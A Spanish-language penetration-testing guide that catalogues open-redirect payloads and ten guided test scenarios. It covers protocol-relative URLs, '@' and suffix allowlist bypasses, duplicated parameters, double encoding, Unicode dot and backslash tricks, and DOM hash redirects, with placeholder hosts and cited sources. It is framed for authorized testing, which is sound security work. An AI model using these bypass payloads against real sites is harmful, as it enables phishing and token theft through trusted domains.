# 🗡️ Open redirect: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Destinos absolutos y relativos a protocolo

```text
https://{HOST_CONTROLADO}/redir-123
//{HOST_CONTROLADO}/redir-123
https://{ORIGEN}/redirect?next=https%3A%2F%2F{HOST_CONTROLADO}%2Fredir-123
```

**Cuándo usarlo:** Las dos primeras líneas son valores para next/url; la tercera es una URL completa. Comprobar Location y destino final, no solo un reflejo.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).


## 🧭 Payloads por contexto

### Allowlist por texto de host

```text
https://{HOST_PERMITIDO}@{HOST_CONTROLADO}/redir-123
https://{HOST_PERMITIDO}.{HOST_CONTROLADO}/redir-123
https://{PREFIJO_CONTROLADO}{HOST_PERMITIDO}/redir-123
```

**Cuándo usarlo:** El host efectivo debe pertenecer al auditor. Cada línea prueba userinfo, prefijo o sufijo textual sin frontera DNS.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).


### Parámetros repetidos y doble decode

```http
GET /redirect?next=%2Fcuenta&next=https%3A%2F%2F{HOST_CONTROLADO}%2Fredir-123 HTTP/1.1
Host: {ORIGEN}

GET /redirect?next=https%253A%252F%252F{HOST_CONTROLADO}%252Fredir-123 HTTP/1.1
Host: {ORIGEN}
```

**Cuándo usarlo:** Requests independientes. La primera busca desacuerdo entre validador y consumidor; la segunda requiere dos decodificaciones. Confirmar navegación externa.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).


## 🔥 Payloads avanzados

### Parser de URL y Unicode

```text
/\/{HOST_CONTROLADO}/redir-123
https://{HOST_PERMITIDO}%E3%80%82{HOST_CONTROLADO}/redir-123
https://{ORIGEN}/redirect/https://{HOST_CONTROLADO}/redir-123
```

**Cuándo usarlo:** La primera depende del tratamiento de backslash del navegador; la segunda normaliza punto ideográfico; la tercera requiere ruta que captura un destino. Verificar URL final.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).


### Redirección del DOM

```text
https://{ORIGEN}/redirect#https://{HOST_CONTROLADO}/redir-123
https://{ORIGEN}/page?redirectTo=https%3A%2F%2F{HOST_CONTROLADO}%2Fredir-123
https://{ORIGEN}/page?returnTo=%2F%2F{HOST_CONTROLADO}%2Fredir-123
```

**Cuándo usarlo:** Solo sirve si JavaScript lee hash, redirectTo o returnTo y asigna location. Distinguirlo de 30x del servidor y registrar el sink.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/open-redirection).


## 🔬 Pruebas guiadas por escenario

### 1. URL absoluta

**Objetivo:** Confirmar si next acepta URL externa propia.

```http
GET /redirect?next=https%3A%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Confirmar Location o navegación hacia el host controlado; un 200 con texto no es redirect.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).

### 2. URL relativa a protocolo

**Objetivo:** Probar un destino // que hereda el esquema.

```http
GET /redirect?next=%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Verificar Location y destino final en navegador; algunos frameworks convierten a ruta local.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 3. Userinfo con @

**Objetivo:** Distinguir host real de texto antes de @.

```text
https://{HOST_PERMITIDO}@{CONTROLLED_HOST}/prueba
```

**Interpretación:** El host efectivo es el situado después de @; usar solo si la validación parece comparar texto de URL.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 4. Sufijo de allowlist

**Objetivo:** Probar coincidencia por prefijo sin límite de host.

```text
https://{HOST_PERMITIDO}.{CONTROLLED_HOST}/prueba
```

**Interpretación:** Solo funciona si el host resultante es del auditor y el validador acepta una comparación incompleta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 5. Parámetro duplicado

**Objetivo:** Detectar si validador y consumidor eligen valores distintos.

```http
GET /redirect?next=%2Fcuenta&next=https%3A%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comparar también cada parámetro solo; no concluir bypass por diferencias de parser sin redirección externa.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 6. Ruta de redirección

**Objetivo:** Probar aplicaciones que incorporan el destino en la ruta.

```http
GET /redirect/https://{CONTROLLED_HOST}/prueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Verificar si el router captura la URL completa y genera Location externo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 7. Codificación doble

**Objetivo:** Identificar un segundo decode después de validar.

```http
GET /redirect?next=https%253A%252F%252F{CONTROLLED_HOST}%252Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La respuesta debe mostrar destino externo tras dos capas; una cadena codificada sin navegación no confirma.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 8. Redirección DOM

**Objetivo:** Observar si JavaScript cliente asigna location desde un fragmento.

```text
https://{ORIGEN}/redirect#https://{CONTROLLED_HOST}/prueba
```

**Interpretación:** Solo aplica si el script lee location.hash y navega; documentar la línea de código o el efecto.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 9. Separador Unicode en el host

**Objetivo:** Probar validador textual que no normaliza el punto ideográfico antes de comparar dominios.

```text
https://{HOST_PERMITIDO}%E3%80%82{CONTROLLED_HOST}/prueba
```

**Interpretación:** El navegador normaliza %E3%80%82 a punto y el host final debe quedar bajo control del auditor; verificar Location y navegación.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 10. Slash y backslash alternos

**Objetivo:** Probar un filtro que solo bloquea dos barras normales antes de pasar el valor al navegador.

```text
/\/{CONTROLLED_HOST}/prueba
```

**Interpretación:** El comportamiento depende del parser y navegador; solo hay hallazgo si se navega al host propio fuera del site.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
